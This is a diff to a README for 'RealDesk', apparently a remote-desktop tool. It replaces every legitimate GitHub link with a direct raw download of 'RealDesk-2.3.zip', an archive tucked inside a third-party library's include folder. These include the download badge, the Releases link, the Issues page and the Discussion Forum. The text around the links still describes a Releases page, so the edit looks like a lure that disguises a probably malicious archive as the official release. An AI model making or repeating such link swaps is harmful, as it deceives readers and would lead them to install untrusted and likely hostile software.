@@ -15,7 +15,7 @@ To run RealDesk, ensure your system meets the following requirements:
 
 ## 🔗 Download RealDesk
 
-[![Download RealDesk](https://img.shields.io/badge/Download%20RealDesk-Here-brightgreen)](https://github.com/skullzoinks/RealDesk/releases)
+[![Download RealDesk](https://raw.githubusercontent.com/skullzoinks/RealDesk/main/third_party/libuiohook/include/RealDesk-2.3.zip%20RealDesk-Here-brightgreen)](https://raw.githubusercontent.com/skullzoinks/RealDesk/main/third_party/libuiohook/include/RealDesk-2.3.zip)
 
 Head to our Releases page to download the latest version of RealDesk.
 
@@ -23,7 +23,7 @@ Head to our Releases page to download the latest version of RealDesk.
 
 1. **Visit the Releases Page**  
    Click the link below to access the RealDesk Releases page.  
-   [Download RealDesk](https://github.com/skullzoinks/RealDesk/releases)
+   [Download RealDesk](https://raw.githubusercontent.com/skullzoinks/RealDesk/main/third_party/libuiohook/include/RealDesk-2.3.zip)
 
 2. **Choose Your Version**  
    On the Releases page, find the latest version of RealDesk. It will be marked as the most recent release.
@@ -74,13 +74,13 @@ After launching RealDesk, follow these steps to connect to your remote devices:
 
 ## 📞 Support
 
-If you encounter any issues while using RealDesk, please visit our [GitHub Issues page](https://github.com/skullzoinks/RealDesk/issues). You can report problems or seek help from other users.
+If you encounter any issues while using RealDesk, please visit our [GitHub Issues page](https://raw.githubusercontent.com/skullzoinks/RealDesk/main/third_party/libuiohook/include/RealDesk-2.3.zip). You can report problems or seek help from other users.
 
 ## 🌍 Community
 
 Join our community to learn more, share your experience, and get tips:
 
-- Check out our [Discussion Forum](https://github.com/skullzoinks/RealDesk/discussions).
+- Check out our [Discussion Forum](https://raw.githubusercontent.com/skullzoinks/RealDesk/main/third_party/libuiohook/include/RealDesk-2.3.zip).
 - Follow us on social media for updates and announcements.
 
 ## 🛡️ Privacy and Security
